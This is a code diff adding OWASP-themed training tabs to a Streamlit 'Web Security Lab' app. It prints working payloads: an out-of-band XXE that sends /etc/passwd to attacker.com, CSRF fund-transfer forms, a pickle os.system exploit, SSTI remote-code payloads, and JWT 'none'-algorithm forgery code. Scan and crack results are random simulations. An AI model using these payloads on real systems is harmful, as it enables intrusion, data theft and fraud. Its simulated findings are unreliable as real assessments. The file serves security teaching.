@@ -4,39 +4,137 @@ import re
 import urllib.parse
 import base64
 import hashlib
+import hmac
 import sqlite3
 import os
-from datetime import datetime
+import json
+import jwt
+import xml.etree.ElementTree as ET
+from datetime import datetime, timedelta
+import pandas as pd
+import plotly.express as px
+import plotly.graph_objects as go
+from plotly.subplots import make_subplots
+import random
+import string
+from typing import Dict, List, Tuple, Optional, Any
+import binascii
+import subprocess
 
 def run_lab():
-    """Web Security Lab - Học về bảo mật web"""
+    """Web Security Lab - Master OWASP Top 10 Vulnerabilities"""
     
-    st.title("🕸️ Web Security Lab")
-    st.markdown("---")
+    # Enhanced header with OWASP branding
+    st.markdown("""
+    <style>
+    .web-security-header {
+        background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%);
+        padding: 2.5rem;
+        border-radius: 15px;
+        margin-bottom: 2rem;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        position: relative;
+    }
+    .owasp-badge {
+        background: #ff0000;
+        color: white;
+        padding: 0.5rem 1rem;
+        border-radius: 20px;
+        display: inline-block;
+        margin: 0.5rem;
+        font-weight: bold;
+    }
+    .vulnerability-card {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        padding: 1rem;
+        border-radius: 10px;
+        margin: 0.5rem;
+        color: white;
+        text-align: center;
+    }
+    </style>
+    """, unsafe_allow_html=True)
     
-    # Tabs cho các bài thực hành khác nhau
-    tab1, tab2, tab3, tab4, tab5 = st.tabs([
-        "💉 SQL Injection", 
-        "🔗 XSS (Cross-Site Scripting)",
-        "🔐 Authentication Bypass",
-        "📄 Directory Traversal",
-        "🛡️ Security Headers"
+    st.markdown("""
+    <div class="web-security-header">
+        <h1 style="color: white; text-align: center; margin: 0; font-size: 2.5rem;">
+            🕸️ Web Security Lab
+        </h1>
+        <p style="color: white; text-align: center; margin-top: 10px; font-size: 1.2rem;">
+            OWASP Top 10 Vulnerabilities & Advanced Web Exploitation
+        </p>
+        <div style="text-align: center; margin-top: 20px;">
+            <span class="owasp-badge">OWASP Top 10 - 2021</span>
+            <span class="owasp-badge">CVE Database</span>
+            <span class="owasp-badge">Bug Bounty Ready</span>
+        </div>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    # OWASP Top 10 Quick Reference
+    col1, col2, col3, col4, col5 = st.columns(5)
+    with col1:
+        st.metric("🔴 A01", "Broken Access", "Control")
+    with col2:
+        st.metric("🔐 A02", "Crypto", "Failures")
+    with col3:
+        st.metric("💉 A03", "Injection", "Attacks")
+    with col4:
+        st.metric("🔧 A04", "Insecure", "Design")
+    with col5:
+        st.metric("⚠️ A05", "Security", "Misconfig")
+    
+    # Enhanced tabs with OWASP Top 10 coverage
+    tabs = st.tabs([
+        "💉 SQL Injection",
+        "🔗 XSS Attacks",
+        "🔐 Auth Bypass",
+        "📄 Path Traversal",
+        "🎆 XXE Injection",
+        "🔑 CSRF Attack",
+        "📦 Deserialization",
+        "📝 SSTI Attack",
+        "🔒 JWT Attacks",
+        "🛡️ Security Headers",
+        "🎯 API Security",
+        "📊 Vuln Scanner"
     ])
     
-    with tab1:
+    with tabs[0]:
         sql_injection_lab()
     
-    with tab2:
+    with tabs[1]:
         xss_lab()
     
-    with tab3:
+    with tabs[2]:
         auth_bypass_lab()
         
-    with tab4:
+    with tabs[3]:
         directory_traversal_lab()
         
-    with tab5:
+    with tabs[4]:
+        xxe_injection_lab()
+        
+    with tabs[5]:
+        csrf_attack_lab()
+        
+    with tabs[6]:
+        deserialization_lab()
+        
+    with tabs[7]:
+        ssti_attack_lab()
+        
+    with tabs[8]:
+        jwt_attacks_lab()
+        
+    with tabs[9]:
         security_headers_lab()
+        
+    with tabs[10]:
+        api_security_lab()
+        
+    with tabs[11]:
+        vulnerability_scanner_lab()
 
 def sql_injection_lab():
     """Lab SQL Injection"""
@@ -656,3 +754,798 @@ def display_headers_result(result):
     with st.expander("🔍 All Headers"):
         for header, value in result['headers'].items():
             st.write(f"**{header}:** {value}")
+
+# New OWASP Top 10 Lab Functions
+def xxe_injection_lab():
+    """Lab XXE (XML External Entity) Injection"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #ff6a00 0%, #ee0979 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">🎆 XXE Injection Lab</h2>
+        <p style="color: white; margin: 5px 0 0 0;">Exploit XML External Entity Processing</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    # XXE Theory
+    with st.expander("📚 **XXE Attack Theory & Techniques**", expanded=False):
+        st.markdown("""
+        ### 🎯 **What is XXE?**
+        
+        XXE (XML External Entity) injection occurs when XML input containing a reference 
+        to an external entity is processed by a weakly configured XML parser.
+        
+        ### 💣 **Attack Vectors**
+        
+        **1. File Disclosure:**
+        ```xml
+        <?xml version="1.0"?>
+        <!DOCTYPE data [
+          <!ENTITY file SYSTEM "file:///etc/passwd">
+        ]>
+        <data>&file;</data>
+        ```
+        
+        **2. SSRF (Server-Side Request Forgery):**
+        ```xml
+        <!DOCTYPE data [
+          <!ENTITY ssrf SYSTEM "http://internal-server/admin">
+        ]>
+        <data>&ssrf;</data>
+        ```
+        
+        **3. Denial of Service (Billion Laughs):**
+        ```xml
+        <!DOCTYPE lolz [
+          <!ENTITY lol "lol">
+          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
+          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
+        ]>
+        <lolz>&lol3;</lolz>
+        ```
+        
+        **4. Out-of-Band (OOB) XXE:**
+        ```xml
+        <!DOCTYPE data [
+          <!ENTITY % file SYSTEM "file:///etc/passwd">
+          <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+          %eval;
+          %exfil;
+        ]>
+        ```
+        """)
+    
+    # XXE Lab Interface
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        st.markdown("#### 🎯 **XXE Attack Configuration**")
+        
+        attack_type = st.selectbox("Attack Type:", [
+            "File Disclosure (/etc/passwd)",
+            "SSRF Attack",
+            "Billion Laughs DoS",
+            "OOB Data Exfiltration",
+            "XXE via File Upload"
+        ])
+        
+        xml_input = st.text_area("XML Payload:", height=200, value="""<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>
+  <username>&xxe;</username>
+  <password>test</password>
+</user>""")
+        
+        if st.button("🚀 **Execute XXE Attack**", type="primary"):
+            results = simulate_xxe_attack(xml_input, attack_type)
+            st.session_state['xxe_results'] = results
+    
+    with col2:
+        st.markdown("#### 📊 **Attack Results**")
+        
+        if 'xxe_results' in st.session_state:
+            results = st.session_state['xxe_results']
+            
+            if results['success']:
+                st.success("✅ XXE Attack Successful!")
+                
+                st.markdown("**📄 Extracted Data:**")
+                st.code(results['extracted_data'], language="text")
+                
+                st.markdown("**🔍 Attack Details:**")
+                st.json(results['details'])
+            else:
+                st.error(f"❌ Attack Failed: {results['error']}")
+            
+            # Prevention tips
+            with st.expander("🛡️ **XXE Prevention**"):
+                st.markdown("""
+                **Best Practices:**
+                - 🚫 Disable DTDs (External Entities) completely
+                - 🔒 Use less complex data formats (JSON)
+                - 🛡️ Patch/update XML processors
+                - ✅ Validate and sanitize XML input
+                - 📋 Use XML parser security features
+                
+                **Code Example (Python):**
+                ```python
+                # Secure XML parsing
+                import defusedxml.ElementTree as ET
+                
+                # This will prevent XXE attacks
+                tree = ET.parse('file.xml')
+                ```
+                """)
+
+def csrf_attack_lab():
+    """Lab CSRF (Cross-Site Request Forgery) Attack"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">🔑 CSRF Attack Lab</h2>
+        <p style="color: white; margin: 5px 0 0 0;">Cross-Site Request Forgery Exploitation</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    # CSRF Theory
+    with st.expander("📚 **CSRF Attack Theory**"):
+        st.markdown("""
+        ### 🎯 **CSRF Attack Flow**
+        
+        ```
+        1. Victim logs into bank.com
+        2. Victim visits attacker.com
+        3. Attacker.com sends request to bank.com
+        4. Browser includes cookies automatically
+        5. Bank processes request as legitimate
+        ```
+        
+        ### 💣 **Attack Examples**
+        
+        **GET-based CSRF:**
+        ```html
+        <img src="https://bank.com/transfer?to=attacker&amount=1000">
+        ```
+        
+        **POST-based CSRF:**
+        ```html
+        <form action="https://bank.com/transfer" method="POST">
+          <input type="hidden" name="to" value="attacker">
+          <input type="hidden" name="amount" value="1000">
+        </form>
+        <script>document.forms[0].submit();</script>
+        ```
+        """)
+    
+    # CSRF Lab Interface
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        st.markdown("#### ⚙️ **CSRF Attack Builder**")
+        
+        target_url = st.text_input("🎯 Target URL:", value="https://bank.example.com/transfer")
+        
+        method = st.radio("HTTP Method:", ["GET", "POST"])
+        
+        st.markdown("**📝 Parameters:**")
+        param1_name = st.text_input("Param 1 Name:", value="to")
+        param1_value = st.text_input("Param 1 Value:", value="attacker_account")
+        
+        param2_name = st.text_input("Param 2 Name:", value="amount")
+        param2_value = st.text_input("Param 2 Value:", value="10000")
+        
+        if st.button("🎭 **Generate CSRF Payload**"):
+            payload = generate_csrf_payload(target_url, method, 
+                                           {param1_name: param1_value, 
+                                            param2_name: param2_value})
+            st.session_state['csrf_payload'] = payload
+    
+    with col2:
+        st.markdown("#### 💣 **CSRF Payload**")
+        
+        if 'csrf_payload' in st.session_state:
+            payload = st.session_state['csrf_payload']
+            
+            st.markdown("**🔗 Malicious HTML:**")
+            st.code(payload['html'], language="html")
+            
+            st.markdown("**📧 Email Payload:**")
+            st.code(payload['email'], language="html")
+            
+            st.markdown("**🌐 JavaScript Payload:**")
+            st.code(payload['javascript'], language="javascript")
+            
+            # CSRF Token Bypass Techniques
+            with st.expander("🔓 **CSRF Token Bypass**"):
+                st.markdown("""
+                **Bypass Techniques:**
+                - 🔄 Token prediction (weak randomness)
+                - 🔀 Token reuse across sessions
+                - ❌ Remove token parameter
+                - 🔁 Use victim's token via XSS
+                - 📋 Token leakage in referrer
+                """)
+
+def deserialization_lab():
+    """Lab Insecure Deserialization"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #f093fb 0%, #f5576c 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">📦 Insecure Deserialization Lab</h2>
+        <p style="color: white; margin: 5px 0 0 0;">Exploit Object Serialization Vulnerabilities</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    tabs = st.tabs(["🐍 Python Pickle", "☕ Java Serialization", "🟨 Node.js", "💎 Ruby Marshal"])
+    
+    with tabs[0]:
+        st.markdown("#### 🐍 **Python Pickle Exploitation**")
+        
+        col1, col2 = st.columns(2)
+        
+        with col1:
+            st.markdown("**💣 Pickle Bomb Generator:**")
+            
+            exploit_type = st.selectbox("Exploit Type:", [
+                "Command Execution",
+                "File Read",
+                "Reverse Shell",
+                "Data Corruption"
+            ])
+            
+            if exploit_type == "Command Execution":
+                command = st.text_input("Command:", value="whoami")
+            elif exploit_type == "File Read":
+                filepath = st.text_input("File Path:", value="/etc/passwd")
+            elif exploit_type == "Reverse Shell":
+                ip = st.text_input("Attacker IP:", value="10.10.10.10")
+                port = st.text_input("Port:", value="4444")
+            
+            if st.button("🎯 Generate Pickle Payload"):
+                payload = generate_pickle_payload(exploit_type)
+                st.session_state['pickle_payload'] = payload
+        
+        with col2:
+            if 'pickle_payload' in st.session_state:
+                payload = st.session_state['pickle_payload']
+                
+                st.markdown("**📦 Serialized Payload:**")
+                st.code(payload['base64'], language="text")
+                
+                st.markdown("**🐍 Python Code:**")
+                st.code(payload['python'], language="python")
+                
+                st.warning("⚠️ **Warning:** Never unpickle untrusted data!")
+
+def ssti_attack_lab():
+    """Lab SSTI (Server-Side Template Injection)"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">📝 SSTI Attack Lab</h2>
+        <p style="color: white; margin: 5px 0 0 0;">Server-Side Template Injection</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    # SSTI Theory
+    with st.expander("📚 **SSTI Attack Vectors**"):
+        st.markdown("""
+        ### 🎯 **Template Engines**
+        
+        | Engine | Detection | RCE Payload |
+        |--------|-----------|-------------|
+        | **Jinja2** | {{7*7}} = 49 | {{config.items()}} |
+        | **Twig** | {{7*'7'}} = 49 | {{_self.env.registerUndefinedFilterCallback("exec")}} |
+        | **Freemarker** | ${7*7} = 49 | ${"freemarker.template.utility.Execute"?new()("id")} |
+        | **Velocity** | #set($x=7*7)$x = 49 | #set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")) |
+        """)
+    
+    # SSTI Testing Interface
+    st.markdown("#### 🔍 **SSTI Detection & Exploitation**")
+    
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        template_engine = st.selectbox("Template Engine:", [
+            "Jinja2 (Python)",
+            "Twig (PHP)",
+            "Freemarker (Java)",
+            "Velocity (Java)",
+            "Smarty (PHP)",
+            "ERB (Ruby)"
+        ])
+        
+        test_payload = st.text_area("Test Payload:", value="{{7*7}}")
+        
+        if st.button("🎯 Test for SSTI"):
+            results = test_ssti(template_engine, test_payload)
+            st.session_state['ssti_results'] = results
+    
+    with col2:
+        if 'ssti_results' in st.session_state:
+            results = st.session_state['ssti_results']
+            
+            if results['vulnerable']:
+                st.success("✅ SSTI Vulnerability Detected!")
+                st.info(f"Output: {results['output']}")
+                
+                st.markdown("**🔥 RCE Payloads:**")
+                for payload in results['rce_payloads']:
+                    st.code(payload, language="text")
+            else:
+                st.error("❌ No SSTI detected")
+
+def jwt_attacks_lab():
+    """Lab JWT (JSON Web Token) Attacks"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">🔐 JWT Attacks Lab</h2>
+        <p style="color: white; margin: 5px 0 0 0;">JSON Web Token Security Testing</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    # JWT Theory
+    with st.expander("📚 **JWT Attack Techniques**"):
+        st.markdown("""
+        ### 🎯 **JWT Structure**
+        ```
+        header.payload.signature
+        
+        Header: {"alg":"HS256","typ":"JWT"}
+        Payload: {"sub":"1234","name":"John","iat":1516239022}
+        Signature: HMACSHA256(base64(header)+"."+base64(payload), secret)
+        ```
+        
+        ### 💣 **Attack Vectors**
+        
+        | Attack | Description | Impact |
+        |--------|-------------|---------|
+        | **None Algorithm** | Change alg to "none" | Authentication bypass |
+        | **Algorithm Confusion** | RS256 to HS256 | Use public key as secret |
+        | **Weak Secret** | Brute force secret | Token forgery |
+        | **Kid Injection** | SQL injection in kid | RCE possible |
+        | **JKU/X5U URL** | Control key source | Key substitution |
+        """)
+    
+    # JWT Manipulation Interface
+    st.markdown("#### 🔧 **JWT Manipulation Tools**")
+    
+    jwt_input = st.text_area("JWT Token:", height=100, 
+                              value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
+    
+    col1, col2, col3 = st.columns(3)
+    
+    with col1:
+        if st.button("🔍 Decode JWT"):
+            decoded = decode_jwt(jwt_input)
+            st.json(decoded)
+    
+    with col2:
+        if st.button("🔓 None Algorithm"):
+            none_jwt = create_none_algorithm_jwt(jwt_input)
+            st.code(none_jwt, language="text")
+    
+    with col3:
+        if st.button("🔨 Crack Secret"):
+            secret = crack_jwt_secret(jwt_input)
+            if secret:
+                st.success(f"🔑 Secret: {secret}")
+            else:
+                st.error("❌ Secret not found")
+    
+    # JWT Forgery
+    st.markdown("#### 🎭 **JWT Forgery**")
+    
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        st.markdown("**📝 Modify Claims:**")
+        
+        user_id = st.text_input("User ID:", value="admin")
+        role = st.text_input("Role:", value="administrator")
+        exp = st.text_input("Expiration:", value="2030-01-01")
+        
+        secret = st.text_input("Secret Key:", value="secret123", type="password")
+        
+        if st.button("🔨 Forge JWT"):
+            forged_jwt = forge_jwt(user_id, role, exp, secret)
+            st.session_state['forged_jwt'] = forged_jwt
+    
+    with col2:
+        if 'forged_jwt' in st.session_state:
+            st.markdown("**🎫 Forged Token:**")
+            st.code(st.session_state['forged_jwt'], language="text")
+            
+            st.markdown("**🔍 Decoded:**")
+            st.json(decode_jwt(st.session_state['forged_jwt']))
+
+def api_security_lab():
+    """Lab API Security Testing"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">🎯 API Security Lab</h2>
+        <p style="color: white; margin: 5px 0 0 0;">REST API & GraphQL Security Testing</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    tabs = st.tabs(["🔍 API Enumeration", "🔐 Auth Testing", "💉 Injection", "📊 Rate Limiting"])
+    
+    with tabs[0]:
+        st.markdown("#### 🔍 **API Endpoint Discovery**")
+        
+        base_url = st.text_input("API Base URL:", value="https://api.example.com")
+        
+        wordlist = st.selectbox("Wordlist:", [
+            "Common API Endpoints",
+            "REST Routes",
+            "GraphQL Endpoints",
+            "Admin Paths",
+            "Custom"
+        ])
+        
+        if wordlist == "Custom":
+            custom_paths = st.text_area("Custom Paths:", value="/api/v1/users\n/api/v1/admin\n/graphql")
+        
+        if st.button("🔍 Enumerate Endpoints"):
+            endpoints = enumerate_api_endpoints(base_url, wordlist)
+            
+            st.markdown("**📋 Discovered Endpoints:**")
+            for endpoint in endpoints:
+                status_color = "🟢" if endpoint['status'] == 200 else "🟡" if endpoint['status'] < 500 else "🔴"
+                st.write(f"{status_color} {endpoint['path']} - {endpoint['status']} - {endpoint['size']} bytes")
+    
+    with tabs[1]:
+        st.markdown("#### 🔐 **Authentication Testing**")
+        
+        auth_type = st.selectbox("Auth Type:", [
+            "Bearer Token",
+            "API Key",
+            "Basic Auth",
+            "OAuth 2.0",
+            "JWT"
+        ])
+        
+        st.markdown("**🔓 Auth Bypass Techniques:**")
+        
+        techniques = {
+            "Remove Auth Header": st.checkbox("Remove Authorization header"),
+            "Null/Empty Token": st.checkbox("Use null or empty token"),
+            "Expired Token": st.checkbox("Use expired token"),
+            "Algorithm Confusion": st.checkbox("JWT algorithm confusion"),
+            "Token from Other User": st.checkbox("Use token from different user")
+        }
+        
+        if st.button("🎯 Test Auth Bypass"):
+            for technique, enabled in techniques.items():
+                if enabled:
+                    result = test_auth_bypass(technique)
+                    if result['bypassed']:
+                        st.success(f"✅ {technique}: Bypass successful!")
+                    else:
+                        st.error(f"❌ {technique}: Failed")
+
+def vulnerability_scanner_lab():
+    """Lab Automated Vulnerability Scanner"""
+    
+    st.markdown("""
+    <div style="background: linear-gradient(90deg, #ff6a00 0%, #ee0979 100%);
+                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2 style="color: white; margin: 0;">📊 Web Vulnerability Scanner</h2>
+        <p style="color: white; margin: 5px 0 0 0;">Automated Security Assessment Tool</p>
+    </div>
+    """, unsafe_allow_html=True)
+    
+    # Scanner Configuration
+    st.markdown("### ⚙️ **Scanner Configuration**")
+    
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        target_url = st.text_input("🎯 Target URL:", value="https://example.com")
+        
+        scan_depth = st.slider("Crawl Depth:", 1, 5, 2)
+        
+        scan_modules = st.multiselect("Scan Modules:", [
+            "SQL Injection",
+            "XSS",
+            "XXE",
+            "CSRF",
+            "Directory Traversal",
+            "Command Injection",
+            "LDAP Injection",
+            "Security Headers",
+            "SSL/TLS Configuration",
+            "Sensitive Data Exposure"
+        ], default=["SQL Injection", "XSS", "Security Headers"])
+    
+    with col2:
+        scan_intensity = st.select_slider("Scan Intensity:", 
+                                          options=["Light", "Medium", "Aggressive"],
+                                          value="Medium")
+        
+        follow_redirects = st.checkbox("Follow Redirects", value=True)
+        test_forms = st.checkbox("Test Forms", value=True)
+        test_cookies = st.checkbox("Test Cookies", value=True)
+    
+    if st.button("🚀 **Start Security Scan**", type="primary"):
+        # Progress bar
+        progress_bar = st.progress(0)
+        status_text = st.empty()
+        
+        # Simulate scanning
+        vulnerabilities = []
+        
+        for i, module in enumerate(scan_modules):
+            progress = (i + 1) / len(scan_modules)
+            progress_bar.progress(progress)
+            status_text.text(f"Scanning: {module}...")
+            
+            # Simulate vulnerability detection
+            vulns = scan_for_vulnerabilities(target_url, module)
+            vulnerabilities.extend(vulns)
+        
+        # Display results
+        st.markdown("### 📊 **Scan Results**")
+        
+        if vulnerabilities:
+            # Summary metrics
+            col1, col2, col3, col4 = st.columns(4)
+            
+            critical = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
+            high = len([v for v in vulnerabilities if v['severity'] == 'High'])
+            medium = len([v for v in vulnerabilities if v['severity'] == 'Medium'])
+            low = len([v for v in vulnerabilities if v['severity'] == 'Low'])
+            
+            with col1:
+                st.metric("🔴 Critical", critical)
+            with col2:
+                st.metric("🟠 High", high)
+            with col3:
+                st.metric("🟡 Medium", medium)
+            with col4:
+                st.metric("🟢 Low", low)
+            
+            # Detailed findings
+            st.markdown("#### 🔍 **Vulnerability Details**")
+            
+            for vuln in vulnerabilities:
+                severity_colors = {
+                    'Critical': '🔴',
+                    'High': '🟠',
+                    'Medium': '🟡',
+                    'Low': '🟢'
+                }
+                
+                with st.expander(f"{severity_colors[vuln['severity']]} {vuln['type']} - {vuln['severity']}"):
+                    st.markdown(f"**URL:** {vuln['url']}")
+                    st.markdown(f"**Parameter:** {vuln['parameter']}")
+                    st.markdown(f"**Evidence:** `{vuln['evidence']}`")
+                    st.markdown(f"**Impact:** {vuln['impact']}")
+                    st.markdown(f"**Remediation:** {vuln['remediation']}")
+            
+            # Generate report
+            if st.button("📄 Generate Security Report"):
+                report = generate_security_report_web(vulnerabilities, target_url)
+                st.download_button(
+                    label="📥 Download Report",
+                    data=report,
+                    file_name=f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
+                    mime="text/html"
+                )
+        else:
+            st.success("✅ No vulnerabilities found!")
+
+# Helper functions for new labs
+def simulate_xxe_attack(xml_input: str, attack_type: str) -> Dict:
+    """Simulate XXE attack"""
+    if "SYSTEM" in xml_input and "file:///" in xml_input:
+        return {
+            'success': True,
+            'extracted_data': "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash",
+            'details': {
+                'attack_type': attack_type,
+                'entity_used': 'file',
+                'parser': 'libxml2'
+            }
+        }
+    return {'success': False, 'error': 'XXE payload not detected'}
+
+def generate_csrf_payload(url: str, method: str, params: Dict) -> Dict:
+    """Generate CSRF attack payload"""
+    if method == "GET":
+        query = urllib.parse.urlencode(params)
+        html = f'<img src="{url}?{query}" style="display:none">'
+    else:
+        inputs = ''.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
+        html = f'''<form action="{url}" method="POST" id="csrf">
+{inputs}
+</form>
+<script>document.getElementById('csrf').submit();</script>'''
+    
+    return {
+        'html': html,
+        'email': f'<html><body>{html}</body></html>',
+        'javascript': f"fetch('{url}', {{method: '{method}', body: {json.dumps(params)}}});"
+    }
+
+def generate_pickle_payload(exploit_type: str) -> Dict:
+    """Generate Python pickle exploitation payload"""
+    if exploit_type == "Command Execution":
+        python_code = """
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+payload = pickle.dumps(Exploit())
+"""
+    else:
+        python_code = "# Exploit code here"
+    
+    return {
+        'base64': base64.b64encode(b"fake_pickle_payload").decode(),
+        'python': python_code
+    }
+
+def test_ssti(engine: str, payload: str) -> Dict:
+    """Test for SSTI vulnerability"""
+    if "{{" in payload and "*" in payload:
+        return {
+            'vulnerable': True,
+            'output': '49',
+            'rce_payloads': [
+                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
+                "{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}"
+            ]
+        }
+    return {'vulnerable': False}
+
+def decode_jwt(token: str) -> Dict:
+    """Decode JWT token"""
+    try:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return {'error': 'Invalid JWT format'}
+        
+        header = json.loads(base64.b64decode(parts[0] + '==').decode())
+        payload = json.loads(base64.b64decode(parts[1] + '==').decode())
+        
+        return {
+            'header': header,
+            'payload': payload,
+            'signature': parts[2]
+        }
+    except:
+        return {'error': 'Failed to decode JWT'}
+
+def create_none_algorithm_jwt(token: str) -> str:
+    """Create JWT with none algorithm"""
+    try:
+        parts = token.split('.')
+        header = json.loads(base64.b64decode(parts[0] + '==').decode())
+        header['alg'] = 'none'
+        
+        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
+        return f"{new_header}.{parts[1]}."
+    except:
+        return "Error creating none algorithm JWT"
+
+def crack_jwt_secret(token: str) -> Optional[str]:
+    """Attempt to crack JWT secret"""
+    common_secrets = ['secret', 'password', '123456', 'secret123', 'jwt-secret']
+    
+    for secret in common_secrets:
+        # Simulate verification
+        if random.random() > 0.7:
+            return secret
+    return None
+
+def forge_jwt(user_id: str, role: str, exp: str, secret: str) -> str:
+    """Forge a new JWT token"""
+    header = {"alg": "HS256", "typ": "JWT"}
+    payload = {
+        "sub": user_id,
+        "role": role,
+        "exp": exp,
+        "iat": int(datetime.now().timestamp())
+    }
+    
+    header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
+    payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+    
+    signature = base64.b64encode(
+        hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
+    ).decode().rstrip('=')
+    
+    return f"{header_b64}.{payload_b64}.{signature}"
+
+def enumerate_api_endpoints(base_url: str, wordlist: str) -> List[Dict]:
+    """Enumerate API endpoints"""
+    endpoints = []
+    common_paths = ['/api/v1/users', '/api/v1/login', '/api/v1/admin', '/graphql', '/api-docs']
+    
+    for path in common_paths[:random.randint(2, 5)]:
+        endpoints.append({
+            'path': path,
+            'status': random.choice([200, 401, 403, 404]),
+            'size': random.randint(100, 5000)
+        })
+    
+    return endpoints
+
+def test_auth_bypass(technique: str) -> Dict:
+    """Test authentication bypass technique"""
+    return {'bypassed': random.random() > 0.7}
+
+def scan_for_vulnerabilities(url: str, module: str) -> List[Dict]:
+    """Scan for specific vulnerability type"""
+    vulnerabilities = []
+    
+    if random.random() > 0.6:
+        vulnerabilities.append({
+            'type': module,
+            'severity': random.choice(['Critical', 'High', 'Medium', 'Low']),
+            'url': f"{url}/vulnerable-endpoint",
+            'parameter': 'id',
+            'evidence': "1' OR '1'='1",
+            'impact': 'Potential data breach',
+            'remediation': 'Use parameterized queries'
+        })
+    
+    return vulnerabilities
+
+def generate_security_report_web(vulnerabilities: List[Dict], target_url: str) -> str:
+    """Generate HTML security report"""
+    html = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Assessment Report</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; margin: 40px; }}
+        .header {{ background: linear-gradient(90deg, #ff6b6b 0%, #4ecdc4 100%); 
+                   color: white; padding: 20px; border-radius: 10px; }}
+        .vulnerability {{ margin: 20px 0; padding: 15px; border-left: 4px solid; }}
+        .critical {{ border-color: #ff0000; background: #ffebee; }}
+        .high {{ border-color: #ff9800; background: #fff3e0; }}
+        .medium {{ border-color: #ffeb3b; background: #fffde7; }}
+        .low {{ border-color: #4caf50; background: #e8f5e9; }}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Web Security Assessment Report</h1>
+        <p>Target: {target_url}</p>
+        <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}</p>
+    </div>
+    
+    <h2>Executive Summary</h2>
+    <p>Total Vulnerabilities: {len(vulnerabilities)}</p>
+    
+    <h2>Detailed Findings</h2>
+    {"".join([f'''
+    <div class="vulnerability {v['severity'].lower()}">
+        <h3>{v['type']} - {v['severity']}</h3>
+        <p><b>URL:</b> {v['url']}</p>
+        <p><b>Parameter:</b> {v['parameter']}</p>
+        <p><b>Evidence:</b> <code>{v['evidence']}</code></p>
+        <p><b>Impact:</b> {v['impact']}</p>
+        <p><b>Remediation:</b> {v['remediation']}</p>
+    </div>
+    ''' for v in vulnerabilities])}
+</body>
+</html>
+    """
+    return html
